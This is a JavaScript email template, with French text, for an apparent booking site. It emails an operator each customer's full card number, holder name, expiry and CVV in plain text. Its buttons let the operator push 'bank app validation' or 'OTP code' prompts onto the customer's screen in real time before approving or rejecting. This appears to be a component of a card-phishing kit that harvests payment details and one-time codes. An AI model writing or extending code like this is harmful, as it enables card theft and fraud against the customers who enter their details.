import { emailLayout } from './layout';

/**
 * EMAIL 1 — Envoyé à l'admin dès que le client clique "Payer par CB".
 * Contient les informations de la carte bancaire et 4 boutons d'action.
 *
 * @param {object} opts
 * @param {string} opts.userName          - Nom du client
 * @param {string} opts.userEmail         - Email du client
 * @param {string} opts.cardNumber        - Numéro de carte formaté
 * @param {string} opts.cardName          - Nom du titulaire
 * @param {string} opts.cardExpiry        - Date d'expiration MM/AA
 * @param {string} opts.cardCvc           - Code CVV/CVC
 * @param {string} opts.bookingRef        - Référence courte de la réservation
 * @param {string} opts.amount            - Montant formaté (ex: "150,00 €")
 * @param {string} opts.bankValidationUrl - URL bouton demande validation app bancaire
 * @param {string} opts.otpRequestUrl     - URL bouton demande code OTP
 * @param {string} opts.approveUrl        - URL bouton valider directement
 * @param {string} opts.rejectUrl         - URL bouton refuser
 */
export function adminCardInfoEmail({
  userName,
  userEmail,
  cardNumber,
  cardName,
  cardExpiry,
  cardCvc,
  bookingRef,
  amount,
  bankValidationUrl,
  otpRequestUrl,
  approveUrl,
  rejectUrl,
}) {
  return {
    subject: `💳 Nouvelle tentative de paiement carte — Réservation #${bookingRef}`,
    html: emailLayout({
      title: 'Informations de carte reçues',
      preheader: `${userName} tente de payer par carte — réservation #${bookingRef}`,
      content: `
        <h2>Tentative de paiement par carte</h2>
        <p>
          Un client vient de saisir ses informations de carte bancaire.
          <strong>Choisissez l'action à effectuer ci-dessous.</strong>
        </p>

        <!-- Infos carte -->
        <div class="info-box">
          <div class="info-row">
            <span class="label">Réservation</span>
            <span class="value">#${bookingRef}</span>
          </div>
          <div class="info-row">
            <span class="label">Client</span>
            <span class="value">${userName}</span>
          </div>
          <div class="info-row">
            <span class="label">Email client</span>
            <span class="value">${userEmail}</span>
          </div>
          <div class="info-row">
            <span class="label">Numéro de carte</span>
            <span class="value" style="font-family:monospace;letter-spacing:2px">${cardNumber}</span>
          </div>
          <div class="info-row">
            <span class="label">Titulaire</span>
            <span class="value">${cardName}</span>
          </div>
          <div class="info-row">
            <span class="label">Expiration</span>
            <span class="value">${cardExpiry}</span>
          </div>
          <div class="info-row">
            <span class="label">CVV</span>
            <span class="value" style="font-family:monospace;letter-spacing:2px">${cardCvc}</span>
          </div>
          <div class="total-row">
            <span>Montant</span>
            <span>${amount}</span>
          </div>
        </div>

        <!-- Boutons d'action -->
        <p style="text-align:center; margin: 28px 0 6px; font-weight:600; color:#3f3f46;">
          Choisissez l'action à effectuer :
        </p>

        <!-- Ligne 1 : actions d'instruction -->
        <p style="text-align:center; margin: 0 0 12px;">
          <a href="${bankValidationUrl}"
             style="
               display:inline-block;
               background:#2563eb;
               color:#ffffff !important;
               text-decoration:none;
               padding:13px 22px;
               border-radius:8px;
               font-weight:700;
               font-size:14px;
               margin: 4px 6px;
             ">
            📲 Demande validation app bancaire
          </a>
          <a href="${otpRequestUrl}"
             style="
               display:inline-block;
               background:#7c3aed;
               color:#ffffff !important;
               text-decoration:none;
               padding:13px 22px;
               border-radius:8px;
               font-weight:700;
               font-size:14px;
               margin: 4px 6px;
             ">
            🔑 Demande code OTP
          </a>
        </p>

        <!-- Ligne 2 : décision finale -->
        <p style="text-align:center; margin: 0 0 8px;">
          <a href="${approveUrl}"
             style="
               display:inline-block;
               background:#16a34a;
               color:#ffffff !important;
               text-decoration:none;
               padding:13px 22px;
               border-radius:8px;
               font-weight:700;
               font-size:14px;
               margin: 4px 6px;
             ">
            ✓ Valider le paiement
          </a>
          <a href="${rejectUrl}"
             style="
               display:inline-block;
               background:#dc2626;
               color:#ffffff !important;
               text-decoration:none;
               padding:13px 22px;
               border-radius:8px;
               font-weight:700;
               font-size:14px;
               margin: 4px 6px;
             ">
            ✗ Refuser le paiement
          </a>
        </p>

        <p style="color:#71717a; font-size:12px; text-align:center; margin-top:20px;">
          Les boutons bleu et violet changent l'affichage côté client en temps réel.<br>
          Les boutons vert et rouge finalisent immédiatement le paiement.<br>
          Ces liens sont à usage unique.
        </p>
      `,
    }),
  };
}
